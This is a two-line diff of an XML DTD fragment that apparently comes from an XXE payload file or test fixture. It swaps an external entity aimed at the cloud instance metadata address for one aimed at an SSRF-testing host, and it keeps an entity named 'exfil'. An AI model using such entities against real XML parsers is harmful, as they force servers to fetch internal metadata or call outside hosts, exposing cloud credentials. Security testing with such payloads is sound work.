@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "http://169.254.169.254/latest/meta-data/">
+<!ENTITY % data SYSTEM "http://ssrftest.com/x/DfKZH">
 <!ENTITY exfil "%data;">
